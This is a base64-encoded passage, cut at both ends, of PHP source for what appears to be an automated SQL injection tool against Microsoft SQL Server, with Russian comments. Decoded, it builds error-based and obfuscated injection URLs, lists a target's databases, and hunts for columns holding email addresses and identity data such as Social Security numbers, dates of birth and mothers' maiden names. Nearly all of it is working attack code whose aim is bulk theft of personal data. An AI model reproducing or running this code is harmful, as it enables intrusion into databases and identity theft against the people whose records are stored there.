bXAsJG10aCkpCXJldHVybiAkbXRoWzFdOwoJCWVsc2UgcmV0dXJuIGZhbHNlOwoJfQoJCglyZXR1cm4gJHRtcDsKfQoKCWZ1bmN0aW9uIHBhcnNlX2xpbmsoJGxpbmspewoKCSR0bXA9cGFyc2VfdXJsKCRsaW5rKTsKCXBhcnNlX3N0cigkdG1wWydxdWVyeSddLCR0bXBbJ3F1ZXJ5J10pOwoJcmV0dXJuICR0bXA7Cn0KCglmdW5jdGlvbiBHZXRCZXR3ZWVuKCRjb250ZW50KXsvL0VCINCy0YvRh9C40YHQu9GP0LXRgiwg0YfRgtC+INC90LDRhdC+0LTQuNGC0YHRjyDQvNC10LbQtNGDINGC0Y3Qs9C+0LIKICAgICRyID0gZXhwbG9kZSgiOm95dToiLCAkY29udGVudCk7CiAgICBpZiAoaXNzZXQoJHJbMV0pKXsKICAgICAgICAkciA9IGV4cGxvZGUoIjpwaHo6IiwgJHJbMV0pOwogICAgICAgIHJldHVybiAkclswXTsKICB9CiAgcmV0dXJuJyc7IAp9CgkKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCQoJCgkKCQoJCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy/QkdCQ0JfQntCS0KvQlSDQlNCb0K8g0JfQkNCf0KDQntCh0J7QkiBNU1NRTC8vLy8vLy8vLy8vLy8vLy8vCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgkKCWZ1bmN0aW9uIG1zc3FsR2V0VmFsdWUoJHBvbGUpey8v0L7QsdGJ0LDRjyDRhNGD0L3QutGG0LjRjyDQtNC70Y8gTVNTUUwKCQkKCQkKCQlpZigkdGhpcy0+bWV0aG9kPT0zKQoJCXsKCQkJLy8kdGhpcy0+ZCgndG9jaGthOiBtZXRob2Q9PTEwIFNMRUVQIG15c3FsR2V0VmFsdWVTbGVlcCcpOwoJCQkkZ2V0ID0gJHRoaXMtPm1zc3FsR2V0RXJyb3IoJHBvbGUpOwoJCQlpZigkZ2V0IT09ZmFsc2UpcmV0dXJuICRnZXQ7CgkJCXJldHVybiBmYWxzZTsKCgkJfQoJCQoJCQoJCSRtZXRob2QgPSAkdGhpcy0+c3Bvc29iOwoJCQoJCS8vJHRoaXMtPmQoJG1ldGhvZCwnJG1ldGhvZCA9ICR0aGlzLT5zcG9zb2InKTsKCgkJCQkJCQkKCQkkbiA9ICR0aGlzLT52YXJpYW50X3F1ZXJ5X21zc3FsWyR0aGlzLT5zcG9zb2JdWyR0aGlzLT5tZXRob2RdWzBdOy8v0L3QsNGH0LDQu9C+INC30LDQv9GA0L7RgdCwCgkJJGsgPSAkdGhpcy0+dmFyaWFudF9xdWVyeV9tc3NxbFskdGhpcy0+c3Bvc29iXVskdGhpcy0+bWV0aG9kXVsxXTsvL9C60L7QvdC10YYgINC30LDQv9GA0L7RgdCwCgkJCgkJLy8kdGhpcy0+ZCgkbiwn0L3QsNGH0LDQu9C+INC30LDQv9GA0L7RgdCwJyk7CgkJLy8kdGhpcy0+ZCgkaywn0LrQvtC90LXRhiAg0LfQsNC/0YDQvtGB0LAnKTsKCQkKCQkvLyR0aGlzLT5kKCR0aGlzLT5jb2x1bW4sJyR0aGlzLT5jb2x1bW4nKTsKCQkvLyR0aGlzLT5kKCR0aGlzLT53b3JrLCckdGhpcy0+d29yaycpOwoJCQoJCgkJJHF1ZXJ5ID0gIjExMTExMTExMTExMTEkbiI7Ly/QvdCw0YfQsNC70YzQvdGL0Lkg0LfQsNC/0YDQvtGBINC00LvRjyDQndCVIHNsZWVwCgkJJHF1ZXJ5X21zc3FsID0gIjExMTExMTExMTExMTEkbiI7Ly/QvdCw0YfQsNC70YzQvdGL0Lkg0LfQsNC/0YDQvtGBINC00LvRjyDQndCVIHNsZWVwCgkJCgkJCQoJCgkJCQkJCQoJCgkJaWYoIWlzX2FycmF5KCRwb2xlKSkkcG9sZSA9IGFycmF5KCRwb2xlKTsvL9GN0YLQviDQutCw0Log0YDQsNC3INC90LDRiCDQt9Cw0L/RgNC+0YEgdmVyc2lvbiDQuiDQv9GA0LjQvNC10YDRgwoJCQoJCSR6YXByID0gJyc7Ly/QvtCx0YnQsNGPINGB0YLRgNC+0LrQsCDQtNC70Y8g0L3QsNGI0LjRhSDQv9C+0LvQtdC5CgkJIAoJCS8v0L7QsdCy0L7Qu9Cw0LrQuNCy0LDQtdC8INC10LPQviDRgdC/0LXRhiDRgdC40LzQstC+0LvQsNC80LgsINGH0YLQvtCx0Ysg0L/QsNGC0L7QvCDQvdCw0LnRgtC4INC80L7QttC90L4g0LHRi9C70L4g0LHRiwoJCWZvcmVhY2ggKCRwb2xlIGFzICRrZXk9PiR2YWwpCgkJewoJICAJCgkJIAlpZihjb3VudCgkcG9sZSk9PTEpCgkJCXsKCQkJCS8v0LXRgdC70Lgg0L7QtNC90L4g0L/QvtC70LUKCQkgCQkvLyR6YXByIC49ICdDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbWF0nKS4nKScuJywnLiR2YWwuJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbWFhdJykuJyknOwoJCQkJCgkJCQkka3UxID0gJHRoaXMtPmNoYXJjaGVyX21zc3FsKCdbWF0nKTsKCQkJCSRrdTIgPSAkdGhpcy0+Y2hhcmNoZXJfbXNzcWwoJ1tYWF0nKTsKCQoJCQkJJHphcHJfbXNzcWwgLj0ka3UxLicrJy4kdmFsLicrJy4ka3UyOwoJCSAJCQoJCSAJfWVsc2UKCQkJewoJCQkJLy/QtdGB0LvQuCDQvdC10YHQutC+0LvRjNC60L4g0L3QsNC50YLQuCDQvdCw0LTQvgoJCSAJCS8vJHphcHIgLj0gJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbJy4kdmFsLiddJykuJyknLicsJy4kdmFsLicsQ0hBUignLiR0aGlzLT5jaGFyY2hlcignWycuJHZhbC4nXScpLicpJzsKCQkJCQoJCQkJCgkJIAl9CgkgIAkKCQl9CgkJCgkJLy8kdGhpcy0+ZCgkemFwciwnZmluYWwgJHphcHInKTsKCQkkdGhpcy0+ZCgkemFwcl9tc3NxbCwnZmluYWwgJHphcHJfbXNzcWwnKTsKCQkkemFwcl9tc3NxbCA9IHVybGVuY29kZSgkemFwcl9tc3NxbCk7Ly91cmwg0LrQvtC00LjRgNGD0LXQvCDRgdC40LzQstC+0LvRiwoJCS8vJHRoaXMtPmQoJHphcHJfbXNzcWwsJ2ZpbmFsICR6YXByX21zc3FsIEVOQ09ERScpOwoKCgkJICR3b3JrX2NvdW50ID0gY291bnQoJHRoaXMtPndvcmspOy8v0YDQsNCx0L7Rh9C40LUg0L/QvtC70Y8g0LPQtNC1INCy0YvQstC+0LQg0LXRgdGC0YwKCQkKCQkgJG5ldyA9IGFycmF5KCk7IC8vINCn0YLQviDQvdCwINCy0YvRhdC+0LTQtQoKCQkgJGdpdmUgPSAwOwoJCSAKCQkgCgkJIC8v0L/QvtC00YHRgtCw0LLQu9GP0LXQvCDQutC+0LvQvtC90LrQuAoJCSBmb3IoJGNvbD0xOyRjb2w8PSR0aGlzLT5jb2x1bW47JGNvbCsrKQoJCQl7CgkJCQlpZigkY29sPT0xKXskemFwPScnO31lbHNleyR6YXA9JywnO30vL9C30LDQv9GP0YLQsNGPCgkJCQoJCQkJaWYoaW5fYXJyYXkoJGNvbCwgJHRoaXMtPndvcmspIEFORCAkZ2l2ZT09MCkKCQkJCXsKCgkJCQkJJHAgPSAkY29sLTE7CgoJCQkJCSRnaXZlKys7CgkJCQkJCgkJCQkJLy8kcXVlcnkgLj0gJHphcC4iQ09OQ0FUKENIQVIoIi4kdGhpcy0+Y2hhcmNoZXIoJ2RkZCcpLiIpLCR6YXByKSI7CgkJCQkJCgkJCQkJJHF1ZXJ5X21zc3FsIC49ICR6YXAuIiR6YXByX21zc3FsIjsKCQkJCQkKCQkJCQkKCQkJCX1lbHNlCgkJCQl7CgkJCQkJCQoJCQkJCWlmKCRvcmRlciE9PWFycmF5KCkgQU5EIGNvdW50KCRwb2xlKT4xKQoJCQkJCXsKCQkJCQkJJHF1ZXJ5X21zc3FsIC49ICR6YXAuIiIuJG9yZGVyWzBdOwoJCQkJCX1lbHNlCgkJCQkJewoJCQkJCQkkcXVlcnlfbXNzcWwgLj0gJHphcC4kY29sOwkKCQkJCQl9CgkJCQl9CQoJCQl9CgkJCQoJCQkKCQkJLy9pZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCRxdWVyeV9tc3NxbCwnJHF1ZXJ5X21zc3FsJyk7fQoJCQkKCQoJCQkvL2lmKCRvcmRlciE9PWFycmF5KCkgQU5EIGNvdW50KCRwb2xlKT4xKQoJCQkvL3sKCQkJCS8vJG9yZGVyID0gJytvcmRlcitieStgJy4kb3JkZXJbMF0uJ2ArJy4kb3JkZXJbMV0uJysnOwoJCQkvL31lbHNlCgkJCS8vewoJCQkvLwkkb3JkZXIgPSAnJzsKCQkJLy99CgkJCQoJCQkKCQkJCQoJCQkKCQkJCWlmKCR0aGlzLT5kZXNjID09MCBBTkQgJHRoaXMtPmRlc2NfZW5hYmxlID09IHRydWUpCgkJCQl7CgkJCQkJJG9yZGVyID0gJ09SREVSIGJ5IGlkIERFU0MnOwogCQkJCQkKCQkJCQkvLyR1cmwxID0gJHRoaXMtPnVybC4kcXVlcnkuJysnLiRmcm9tLicrJy4kd2hlcmUuJysnLiRvcmRlci4nK2xpbWl0KycuJGxpbWl0LicnLiRrOwoJCQkJCQoJCQkJCSR1cmwxX21zc3FsID0gJHRoaXMtPnVybC4kcXVlcnlfbXNzcWwuJGs7CgkJCQkJCgkJCQl9ZWxzZQoJCQkJewoJCQkJCS8vJHVybDEgPSAkdGhpcy0+dXJsLiRxdWVyeS4nKycuJGZyb20uJysnLiR3aGVyZS4nKycuJG9yZGVyLicrbGltaXQrJy4kbGltaXQuJyc7CgkJCQkJCgkJCQkJJHVybDFfbXNzcWwgPSAkdGhpcy0+dXJsLiRxdWVyeV9tc3NxbC4kazsKCQkJCQkKCQkJCX0KCgkJCQkKCQkJCQoJCQkJCgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcsLCcsICcsJywkdXJsMSk7CgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcrKycsICcrJywkdXJsMSk7CgkJCQkkdXJsMSA9IHN0cl9yZXBsYWNlKCcrKysnLCcrJywkdXJsMSk7CgkJCQkKCQkJCQoJCQkJCgkJCQlpZigkdGhpcy0+ZGVidWc9PXRydWUpeyR0aGlzLT5kKCR1cmwxX21zc3FsLCckdXJsMV9tc3NxbCDQv9C+0LvQvdGL0LkgTVNTUUxHZXRWYWx1ZScpO30KCQkJCQoJCQkJJHVybDEgPSAkdXJsMV9tc3NxbDsKCQkJCQoJCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybDEpOwoJCQkJCgkJCQkvLyR0aGlzLT5kKCRmaWxlLCckZmlsZScpOwoJCQkJCgkJCQkKCQkJCWlmKCR0aGlzLT5tc3NxbD09dHJ1ZSl7CgkJCQkJZmlsZV9wdXRfY29udGVudHMoJy4vZmlsZV9tc3NxbC50eHQnLCRmaWxlKTsKCgkJCQl9ZWxzZWlmKCR0aGlzLT5wb3N0X2VuYWJsZT09dHJ1ZSl7CgkJCQkJCgkJCQkJZmlsZV9wdXRfY29udGVudHMoJy4vZmlsZV9wb3N0LnR4dCcsJGZpbGUpOwoJCQkJfWVsc2V7CgkJCQkJCgkJCQkJZmlsZV9wdXRfY29udGVudHMoJy4vZmlsZS50eHQnLCRmaWxlKTsKCQkJCX0KCQkJCQoJCQkJCgkJCQkvLyR0aGlzLT5kKCRmaWxlLCdmaWxlJyk7CgkJCQkvL2V4aXQ7CgkJCQkKCQkJCS8v0LjRidC10Lwg0YDQtdC30YPQu9GM0YLQsNGC0YsJCgkJCQlpZihjb3VudCgkcG9sZSk9PTEpIC8v0LXRgdC70Lgg0L7QvSDQvtC00LjQvSDQv9GA0LXQtNC/0L7Qu9Cw0LPQsNC10YLRgdGPCgkJCQl7CgkJIAkJCgkJCQkJcHJlZ19tYXRjaF9hbGwoIn5cW1hcXSguKj8pXFtYWFxdfmlzIiwkZmlsZSwkYXJyKTsKCQkJCQkKCQkJCQkKCQkJCQkvLyR0aGlzLT5kKCRhcnIsJ2FyciBPTkUnKTsKCQkJCQkKCQkJCQkKCgkJCQkJaWYoaXNzZXQoJGFyclsxXVswXSkpcmV0dXJuIGFycmF5KCRwb2xlWzBdPT4kYXJyWzFdWzBdKTsKCQkJCQkKCQkJCQlyZXR1cm4gZmFsc2U7CgkJIAkJCgkJCQl9ZWxzZS8v0LXRgdC70Lgg0L3QtSDRgdC60L7Qu9GM0LrQviDQv9C+0LvQtdC5INCx0YvQu9C+CgkJCQl7CgkJIAkJCQkKCQkJCQlmb3JlYWNoICgkcG9sZSBhcyAkdmFsKQoJCQkJCXsKCQkJIAkKCQkJCQkJcHJlZ19tYXRjaF9hbGwoIn5cW3skdmFsfVxdKC4qPylcW3skdmFsfVxdfmlTIiwkZmlsZSwkYXJyKTsKCQkJCQkJCgkJCQkJCS8vJHRoaXMtPmQoIn5cW3skdmFsfVxdKC4qPylcW3skdmFsfVxdfmlTIiwncmVnIEFMTCcpOwoJCQkJCQkkdGhpcy0+ZCgkYXJyLCdhcnJBX0xMTCcpOwoJCQkJCQkKCQkJCQkKCQkJCQoJCQkJCQlpZihpc3NldCgkYXJyWzFdWzBdKSkKCQkJCQkJewoJCQkJCQkJJGV4cG9ydFskdmFsXSA9ICRhcnJbMV1bMF07CgkJCQkJCX1lbHNlCgkJCQkJCXsKCQkJCQkJCSRleHBvcnRbJHZhbF0gPSAnbnVsbCc7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQoJCQkJaWYocHJlZ19tYXRjaCgnL2lzIG5vdCBhYmxlIHRvIGFjY2VzcyB0aGUgZGF0YWJhc2UvaScsJGZpbGUpKXsKCQkJCQkKCQkJCQkkdGhpcy0+YmFkX2JvZHk9JHRoaXMtPmJhZF9ib2R5KzE7CgkJCQkJCgkJCQl9CgkJCQoJCQkKCQkJCgkJCWlmKGlzc2V0KCRleHBvcnQpKQoJCQl7CQoJCQkJcmV0dXJuICRleHBvcnQ7CgkJCX0KCQkJCgkJCXJldHVybiBmYWxzZTsKCQkKCQkKCX0KCQoJZnVuY3Rpb24gbXNzcWxHZXRFcnJvcigkcG9sZSl7Ly/QtNC+0YfQtdGA0L3Rj9GPCgkJCgkJJHN0cmluZ1snJ10gID0gIithbmQrMT1jb252ZXJ0KGludCwoJHBvbGUpKSI7CgkJCgkJCgkJJHNwID0gMDsKCQkKCQkKCQkKCQlmb3JlYWNoICgkc3RyaW5nIGFzICRrZXk9PiAkdmFsKQoJCXsKCQkJCgkJCSRzdHIxID0gJHRoaXMtPmdldENvbnRlbnRzKCR0aGlzLT51cmwuJHZhbCk7CgkJCQoJCQkkdGhpcy0+ZCgkdGhpcy0+dXJsLiR2YWwsJyR0aGlzLT51cmwuJHZhbCcpOwoJCQkkdGhpcy0+ZCgkc3RyMSwnJHN0cjEnKTsKCQkJLy9leGl0OwoJCQkKCQkJaWYoJHN0cjEgIT0nJyl7CgkJCQoJCQkJcHJlZ19tYXRjaCgifnZhbHVlIFwnKC4qKVwnIHRvIGRhdGEgdHlwZSBpbnR+aXMiLCRzdHIxLCRhcnIpOwoJCQkJJHRoaXMtPmQoJGFyciwnJGFycicpOwoJCQkJcmV0dXJuIGFycmF5KCRwb2xlPT4kYXJyWzFdKTsKCQkJCS8vcmV0dXJuICRkYXRhWyIkcG9sZSJdID0gJGFyclsxXTsKCQkKCQkJCQoJCQkvLyRzcCsrOwoJCQl9CgkJfQoJCQoJCQkvKioJCgkJaWYoaXNfYXJyYXkoJHBvbGUpKXsKCQkJCgkJCQoJCQlmb3JlYWNoICgkcG9sZSBhcyAkdmFsKXsKCgkJCQkkdXJsID0gJHRoaXMtPnVybC4kdGhpcy0+Z2V0X2J5X2Vycm9yLicrYW5kJTI4c2VsZWN0KzErZnJvbSUyOHNlbGVjdCtjb3VudCUyOColMjklMkNjb25jYXQlMjglMjhzZWxlY3QrJTI4c2VsZWN0KyUyOFNFTEVDVCtkaXN0aW5jdCtjb25jYXQlMjgweDdlJTJDMHgyNyUyQycuJHZhbC4nJTJDMHgyNyUyQzB4N2UlMjkrJy4kZnJvbS4nKycuJHdoZXJlLicrTElNSVQrJy4kbGltaXQuJyUyOSUyOStmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrbGltaXQrMCUyQzElMjklMkNmbG9vciUyOHJhbmQlMjgwJTI5KjIlMjklMjl4K2Zyb20raW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcytncm91cCtieSt4JTI5YSUyOSthbmQrJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLicxJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLiclM0QnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJzEnOwoKCQkJLy8JZWNobyAkdXJsLic8YnIvPic7CgkJCQkKCQkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoJCQoJCQkJcHJlZ19tYXRjaF9hbGwoIn5cJyguKj8pXCcgZm9yIGtleX4iLCRmaWxlLCRhcnIpOwoJCQoJCQkJJGFyclsxXVswXSA9IHN0cl9yZXBsYWNlKCInfjEiLCcnLCRhcnJbMV1bMF0pOwoJCQkJLy8kdGhpcy0+ZCgkYXJyLCckYXJyIDEnKTsKCQkJCSRuZXdbJHZhbF0gPSAkYXJyWzFdWzBdOwoJCQkJCQoJCQkJCgkJCX0KCQkJCgkJCXJldHVybiAkbmV3OwoJCQkKCQl9ZWxzZQoJCXsKCgkJCSR1cmwgPSAkdGhpcy0+dXJsLiR0aGlzLT5nZXRfYnlfZXJyb3IuJythbmQlMjhzZWxlY3QrMStmcm9tJTI4c2VsZWN0K2NvdW50JTI4KiUyOSUyQ2NvbmNhdCUyOCUyOHNlbGVjdCslMjhzZWxlY3QrJTI4U0VMRUNUK2Rpc3RpbmN0K2NvbmNhdCUyOCcuJHBvbGUuJyUyQzB4MjclMkMweDdlJTI5KycuJGZyb20uJysnLiR3aGVyZS4nK0xJTUlUKycuJGxpbWl0LiclMjklMjkrZnJvbStpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzK2xpbWl0KzAlMkMxJTI5JTJDZmxvb3IlMjhyYW5kJTI4MCUyOSoyJTI5JTI5eCtmcm9tK2luZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMrZ3JvdXArYnkreCUyOWElMjkrYW5kKycuJHRoaXMtPmdldF9ieV9lcnJvci4nMScuJHRoaXMtPmdldF9ieV9lcnJvci4nJTNEJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLicxJzsKCQkKCQkJJGZpbGUgPSAkdGhpcy0+Z2V0Q29udGVudHMoJHVybCk7CgkJCS8vZWNobyAkZmlsZTsKCQkKCQkJcHJlZ19tYXRjaF9hbGwoIn5cJyguKj8pXCcgZm9yIGtleX4iLCRmaWxlLCRhcnIpOwoJCQkkYXJyWzFdWzBdID0gc3RyX3JlcGxhY2UoIid+MSIsJycsJGFyclsxXVswXSk7CgkJCQoJCQkvLyR0aGlzLT5kKCRhcnIsJyRhcnIgMicpOwoJCQlyZXR1cm4gYXJyYXkoJHBvbGU9PiRhcnJbMV1bMF0pOwoJCQkKCQl9CQoqKi8KCQlyZXR1cm4gZmFsc2U7Cgl9CgkKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8JCgkvLy8vLy8vLy/QpNGD0L3QutGG0LjQuCDQvtC/0YDQtdC00LXQu9C10L3QuNGPINC60L7QvdC60YDQtdGC0L3Ri9GFINC/0LDRgNCw0LzQtdGC0YDQvtCyINC00LvRjyBNU1NRTC8vLy8KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8KCQoJCgkKCQoJCglmdW5jdGlvbiBtc3NxbEdldExpa2VFbWFpbCgpey8v0L/QvtC40YHQuiDQstGB0LXRhSDQvNGL0Lsg0LLQviDQstGB0LXRhSDQkdCUCgkJCgkJJHRoaXMtPm1zc3FsR2V0RGF0YWJhc2UoKTsKCQkkdGhpcy0+ZCgkdGhpcy0+ZGF0YWJhc2UsJ2RhdGFiYXNlJyk7CgkJCgkJLy8kYmQgPSAkdGhpcy0+ZGF0YWJhc2U7CgkJCgkJCgkJJGJkcyA9ICR0aGlzLT5tc3NxbEdldEFsbEJkKCk7CgkJCgkJJHRoaXMtPmQoJGJkcywnJGJkcyBhbGwnKTsKCQkKCQkKCQlpZihjb3VudCgkYmRzKT09MCBvciAkYmRzID09JycpcmV0dXJuIGZhbHNlOwoJCQoJCQoJCWZvcmVhY2goJGJkcyBhcyAkYmQpCgkJewoJCQoJCQoJCQkKCQkKCQkJaWYodHJpbSgkYmQpID09ICdtYXN0ZXInKWNvbnRpbnVlOwoJCQkKCQkJaWYodHJpbSgkYmQpID09ICd0ZW1wZGInKWNvbnRpbnVlOwoJCQkKCQkJaWYodHJpbSgkYmQpID09ICdtb2RlbCcpY29udGludWU7CgkJCQoJCQlpZih0cmltKCRiZCkgPT0gJ21zZGInKWNvbnRpbnVlOwoJCQkKCQkJaWYodHJpbSgkYmQpID09ICdkaXN0cmlidXRpb24nKWNvbnRpbnVlOwoJCQkKCQkJaWYodHJpbSgkYmQpID09ICdSZXBvcnRTZXJ2ZXInKWNvbnRpbnVlOwoJCQkKCQkJaWYodHJpbSgkYmQpID09ICdSZXBvcnRTZXJ2ZXJUZW1wREInKWNvbnRpbnVlOwoJCQoJCQkkdGhpcy0+ZCgkYmQsJyMjIyMjIyMjIyMjIyMjIyMgQkQgIyMjIyMjIyMjIyMjIyMjJyk7CgkJCQoJCQkkbWFpbCA9ICR0aGlzLT5jaGFyY2hlcl9tc3NxbCgnJW1haWwlJyk7CgkJCQoJCQkKCQkJLy8gLyoqL0NPTExBVEUgREFUQUJBU0VfREVGQVVMVCAgCgkJCSRjb3VudCA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovY0FzVChjb3VudCh0Lm5hbWUpIGFzIGNoYXIpIGFzIHggLyoqL2ZSb00gWyIuJGJkLiJdLi5bc3lzb2JqZWN0c10gdCBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsKSIpOwoJCQkKCQkJJGNvdW50ID0gJGNvdW50WyIoLyoqL3NFbEVjVCAvKiovY0FzVChjb3VudCh0Lm5hbWUpIGFzIGNoYXIpIGFzIHggLyoqL2ZSb00gWyIuJGJkLiJdLi5bc3lzb2JqZWN0c10gdCBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsKSJdOwoJCQkKCQkJaWYoZW1wdHkoJGNvdW50KSkkY291bnQgPSAwOwoJCQkJaWYoJGNvdW50PT0wKXsKCQkJCQkkdGhpcy0+ZCgkYmQsJyBDT05USU5VRSAgLSAnLiRwcHMpOwoJCQkJCWNvbnRpbnVlIDE7fQoJCQkJCgkJCQoJCQkKCQkJCgkJCWZvciAoJGk9MDskaTwkY291bnQ7JGkrKykKCQkJewoJCQkJJHRhYmxlID0gJHRoaXMtPm1zc3FsR2V0VmFsdWUoIigvKiovc0VsRWNUIHRvcCAxIHggLyoqL2ZSb00gKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAkaSAodC5uYW1lKSBhcyB4IC8qKi9mUm9NIFsiLiRiZC4iXS4uW3N5c29iamVjdHNdIHQgRlVMTCBPVVRFUiBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsIG9yZGVyIGJ5IHggYXNjKSBzcSBvcmRlciBieSB4IGRlc2MpIik7CgkJCQkKCQkJCQoJCQkJCgkJCQkKCQkJCQoJCQkJaWYoY291bnQoJHRhYmxlKSAhPTAgQU5EICR0YWJsZSAhPScnKQoJCQkJewoJCQkJCQoJCQkJCQoJCQkJCSR0YWJsZV9vbmUgPSAkdGFibGVbIigvKiovc0VsRWNUIHRvcCAxIHggLyoqL2ZSb00gKC8qKi9zRWxFY1QgLyoqL2RJc1RpTmNUIHRvcCAkaSAodC5uYW1lKSBhcyB4IC8qKi9mUm9NIFsiLiRiZC4iXS4uW3N5c29iamVjdHNdIHQgRlVMTCBPVVRFUiBqb2luIFtzeXNjb2x1bW5zXSBhcyBjIG9uIHQuaWQgPSBjLmlkIC8qKi93SGVSZSB0Lnh0eXBlID0gY2hhcig4NSkgYW5kIGMubmFtZSBsaWtlICRtYWlsIG9yZGVyIGJ5IHggYXNjKSBzcSBvcmRlciBieSB4IGRlc2MpIl07CgkJCQkJCgkJCQkJCgkJCQkJJGNvbHVtbiA9ICR0aGlzLT5tc3NxbEdldENvbHVtbnNFbWFpbCgkYmQsJHRhYmxlX29uZSk7CgkJCQkJCgkJCQkJJHRoaXMtPmQoJGNvbHVtbiwkYmQuJzo6OicuJHRhYmxlX29uZSk7CgkJCQkJCgkJCQkJaWYoY291bnQoJGNvbHVtbikgIT0wIEFORCAkY29sdW1uICE9JycpCgkJCQkJewoJCQkJCQkKCQkJCQkJJG1zc3FsWyRiZC4nOjo6Jy4kdGFibGVfb25lLic6OjonLiRjb2x1bW5dID0gJGJkLic6OjonLiR0YWJsZV9vbmUuJzo6OicuJGNvbHVtbjsKCQkJCQkJCQoJCQkJCX0KCQkJCX0KCQkJfQoJCQkvL2JyZWFrOwoJCX0JCgkJCQoJCgkJJG1zc3FsICA9IGFycmF5X3VuaXF1ZSgkbXNzcWwpOwoJCQoJCS8vJHRoaXMtPmQoJG1zc3FsLCckbXNzcWwtdGFibGVzJyk7CgkJCgkJcmV0dXJuICRtc3NxbDsKCQkKCQkKCQkKCX0KCQoJZnVuY3Rpb24gbXNzcWxHZXRDb2x1bW5zRW1haWwoJGJkLCR0YWJsZSl7Ly/Qn9C+0LjRgdC6INC60L7Qu9C+0L3QutC4INGBINC80YvQu9Cw0LzQuAoJCQoJCQoJCQkKCQkkbWFpbCA9ICR0aGlzLT5jaGFyY2hlcl9tc3NxbCgnJW1haWwlJyk7CgkJJHRhYmxlX25ldyA9ICR0aGlzLT5jaGFyY2hlcl9tc3NxbCgkdGFibGUpOwoJCQoJCQoJCSRxcSA9ICR0aGlzLT5tc3NxbEdldFZhbHVlKCIoLyoqL3NFbEVjVCAvKiovZElzVGlOY1QgdG9wIDEgY29sdW1uX25hbWUgZnJvbSAoc2VsZWN0IGRpc3RpbmN0IHRvcCAxIGNvbHVtbl9uYW1lIGZyb20gJGJkLmluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWUgPXskdGFibGVfbmV3fSBBTkQgY29sdW1uX25hbWUgbGlrZSAkbWFpbCBvcmRlciBCWSBjb2x1bW5fbmFtZSAgQVNDKSBzcSBvcmRlciBCWSBjb2x1bW5fbmFtZSBBU0MpIik7CgkJCgoJCQoJCXJldHVybiAkcXFbIigvKiovc0VsRWNUIC8qKi9kSXNUaU5jVCB0b3AgMSBjb2x1bW5fbmFtZSBmcm9tIChzZWxlY3QgZGlzdGluY3QgdG9wIDEgY29sdW1uX25hbWUgZnJvbSAkYmQuaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9eyR0YWJsZV9uZXd9IEFORCBjb2x1bW5fbmFtZSBsaWtlICRtYWlsIG9yZGVyIEJZIGNvbHVtbl9uYW1lICBBU0MpIHNxIG9yZGVyIEJZIGNvbHVtbl9uYW1lIEFTQykiXTsKCQkKCQkKCQkKCX0KCQoJCglmdW5jdGlvbiBtc3NxbEdldExpa2VTc24oKXsvL9C/0L7QuNGB0Log0LLRgdC10YUgc25uINCy0L4g0LLRgdC10YUg0JHQlAoJCQoJCS8vJHRoaXMtPm1zc3FsR2V0RGF0YWJhc2UoKTsKCQkKCQkKCQkkYmRzID0gJHRoaXMtPm1zc3FsR2V0QWxsQmQoKTsKCQkKCQkkdGhpcy0+ZCgkYmRzLCckYmRzIGFsbCcpOwoJCQoJCQoJCWlmKGNvdW50KCRiZHMpPT0wIG9yICRiZHMgPT0nJylyZXR1cm4gZmFsc2U7CgkJCgkJCgkJCgkJJHBhc3MgPSBhcnJheSgKCQknc3NuJywKCQknZG9iJywKCQknc29jaWFsX3NlY3VyaXR5X251bWJlcicsCgkJJ3NvY2lhbC1zZWN1cml0eS1udW1iZXInLAoJCSdzb2NpYWxzZWN1cml0eW51bWJlcicsCgkJJ21tbicpOwoJCQoJCS8vJHRoaXMtPmQoJHBhc3MpOwoJCQoJCQoJCWZvcmVhY2ggKCRwYXNzIGFzICRw